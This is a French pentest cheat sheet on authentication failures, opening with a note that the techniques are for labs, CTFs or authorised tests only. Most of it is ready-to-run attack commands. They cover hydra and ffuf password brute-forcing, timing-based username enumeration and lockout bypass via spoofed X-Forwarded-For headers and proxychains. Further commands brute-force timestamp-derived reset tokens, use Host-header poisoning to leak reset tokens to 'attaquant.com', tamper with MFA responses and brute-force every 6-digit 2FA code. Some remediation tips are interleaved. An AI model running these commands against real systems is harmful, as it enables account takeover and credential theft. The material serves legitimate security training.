# Authentication Failures — fiche de triche terrain

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## 1. Attaques par dictionnaire & brute-force

```bash
hydra -l admin -P rockyou.txt cible.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
# Brute-force un formulaire de login HTTP POST avec un utilisateur fixe et une wordlist de mots de passe

hydra -L users.txt -P passwords.txt ssh://cible.com
# Attaque combinée : liste d'utilisateurs × liste de mots de passe sur un service SSH
```

```bash
ffuf -w passwords.txt -X POST -d "user=admin&pass=FUZZ" -u https://cible.com/login \
  -fc 401
# Fuzzing de mot de passe, filtre les réponses HTTP 401 (échec) pour n'afficher que les succès potentiels
```

| Méthode | Principe |
|---|---|
| Dictionary attack | Teste une liste finie de mots de passe courants ou fuités (ex : rockyou.txt) |
| Brute-force pur | Génère et teste exhaustivement toutes les combinaisons possibles dans un espace donné |
| Credential stuffing | Réutilise des paires identifiant/mot de passe issues de fuites de données tierces |
| Password spraying | Teste un seul mot de passe commun sur de nombreux comptes, pour éviter le lockout par compte |

### Énumération d'utilisateurs

```text
Login "admin" + mauvais mot de passe   → "Mot de passe incorrect"
Login "inconnu" + mauvais mot de passe → "Utilisateur inconnu"
# Un message d'erreur différencié confirme l'existence du compte "admin"
```

```bash
for user in $(cat users.txt); do
  time_start=$(date +%s%N)
  curl -s -o /dev/null -d "user=$user&pass=x" https://cible.com/login
  time_end=$(date +%s%N)
  echo "$user : $(( (time_end - time_start) / 1000000 )) ms"
done
# Mesure le temps de réponse par utilisateur : un délai anormalement plus long peut trahir un compte existant
```

!!! tip "Timing attack sur le hachage"
    Un serveur qui hache le mot de passe uniquement si l'utilisateur existe (avant de comparer) introduit un délai mesurable par rapport à un rejet immédiat pour un utilisateur inconnu — signature classique exploitable statistiquement sur de nombreuses requêtes.

!!! warning "Messages d'erreur génériques recommandés"
    Un message uniforme ("Identifiants invalides") pour tout échec, combiné à un temps de réponse constant, neutralise ce vecteur d'énumération côté défense.

---

## 2. Contournement de verrouillage & lockout

### Bypass via en-têtes de provenance IP

```bash
curl -H "X-Forwarded-For: 1.2.3.4" -d "user=admin&pass=test1" https://cible.com/login
curl -H "X-Forwarded-For: 1.2.3.5" -d "user=admin&pass=test2" https://cible.com/login
# Chaque requête présente une IP source différente si le lockout se base sur cet en-tête
```

| En-tête à tester | Alternative |
|---|---|
| `X-Forwarded-For` | `X-Originating-IP` |
| `X-Forwarded-Host` | `X-Remote-IP` |
| `X-Client-IP` | `X-Remote-Addr` |
| `Forwarded` | `True-Client-IP` |

!!! tip "Rotation automatisée"
    Un script combinant une liste d'IP factices avec l'en-tête vulnérable permet d'automatiser le contournement du compteur de tentatives sur un identifiant unique.

### IP rotation réelle (proxy/VPN)

```bash
proxychains hydra -l admin -P passwords.txt cible.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
# Fait transiter chaque tentative par un proxy différent, contournant un lockout basé sur l'IP source réelle
```

### Case-sensitivity du lockout

```text
Tentative 1 : Admin / pass1     → comptabilisée
Tentative 2 : admin / pass2     → comptabilisée séparément si le compteur est sensible à la casse
Tentative 3 : ADMIN / pass3     → idem
# Trois compteurs distincts au lieu d'un seul si le nom d'utilisateur n'est pas normalisé avant comparaison
```

!!! warning "Normalisation requise côté serveur"
    Le compteur de tentatives et la résolution du compte utilisateur doivent reposer sur une normalisation identique (casse, espaces) pour éviter qu'une variante orthographique ne réinitialise artificiellement le lockout.

---

## 3. Faiblesses des fonctions "mot de passe oublié"

### Prédictibilité des tokens de réinitialisation

```text
Token observé : 1698765432-a1b2c3
# Préfixe correspondant à un timestamp Unix, suffixe court potentiellement dérivé d'une seed faible
```

| Faiblesse de token | Risque |
|---|---|
| Timestamp Unix en clair ou dérivé | Prévisible, réduit l'espace de recherche à une fenêtre temporelle |
| Génération via `rand()` non cryptographique | Séquence potentiellement reproductible (PRNG faible) |
| Token court (< 128 bits d'entropie) | Brute-forçable dans un temps raisonnable |
| Absence d'expiration | Réutilisable indéfiniment après capture |
| Absence de liaison à la session d'origine | Réutilisable depuis n'importe quel contexte |

```bash
for i in $(seq 1698765400 1698765500); do
  curl -s "https://cible.com/reset?token=${i}-a1b2c3" | grep -q "success" && echo "Token valide : $i"
done
# Brute-force d'une fenêtre temporelle réduite si le token dérive d'un timestamp approximatif connu
```

### Empoisonnement d'en-tête Host

```bash
curl -H "Host: attaquant.com" -d "email=victime@cible.com" https://cible.com/forgot-password
# Si le lien de réinitialisation est généré à partir de l'en-tête Host non validé...
```

```text
Email reçu par la victime :
"Cliquez ici pour réinitialiser : https://attaquant.com/reset?token=xyz789"
# Le lien pointe vers le domaine attaquant, capturant le token dès que la victime clique
```

!!! warning "Impact critique"
    L'empoisonnement de Host détourne un mécanisme légitime (e-mail envoyé par l'application elle-même) pour exfiltrer un token de réinitialisation valide vers un domaine contrôlé par l'attaquant, sans nécessiter d'accès préalable au compte.

!!! tip "Remédiation"
    Générer les liens de réinitialisation à partir d'une valeur de domaine codée en dur côté serveur, jamais depuis l'en-tête `Host` fourni par le client.

---

## 4. Contournement 2FA / MFA

### Manipulation de réponses HTTP/JSON

```json
// Réponse originale après échec du code 2FA
{ "success": false, "mfa_required": true }
```

```json
// Réponse interceptée et modifiée avant transmission au client (via proxy)
{ "success": true, "mfa_required": false }
```

!!! warning "Logique de validation côté client"
    Si la décision de rediriger vers l'espace authentifié repose sur ce champ JSON interprété côté client plutôt que sur une vérification serveur stricte de la session, la modification de la réponse suffit à contourner intégralement le second facteur.

### Réutilisation de tokens / attaques par relecture

```bash
curl -d "code=123456" https://cible.com/verify-2fa
# Capture du code 2FA valide via une requête interceptée

curl -d "code=123456" https://cible.com/verify-2fa
# Rejeu de la même requête : succès si le code n'est pas invalidé après un premier usage
```

| Faiblesse MFA | Risque |
|---|---|
| Code 2FA non invalidé après usage | Réutilisable jusqu'à expiration de sa fenêtre temporelle |
| Absence de limite de tentatives sur le code 2FA | Brute-force possible sur un code à 6 chiffres (10⁶ combinaisons) |
| Contrôle 2FA effectué uniquement côté client | Contournable par manipulation directe de la réponse serveur |
| Absence de liaison code ↔ session | Un code valide pour un compte peut être rejoué sur une autre session |

```bash
for code in $(seq -w 0 999999); do
  curl -s -d "code=$code" https://cible.com/verify-2fa | grep -q "success" && echo "Code valide : $code"
done
# Brute-force exhaustif d'un code 2FA à 6 chiffres, viable en l'absence de limite de tentatives
```

!!! tip "Remédiation"
    Invalider le code après un seul usage réussi, limiter strictement les tentatives (lockout après 3-5 essais), et valider systématiquement le second facteur côté serveur avant toute élévation de privilège de session.
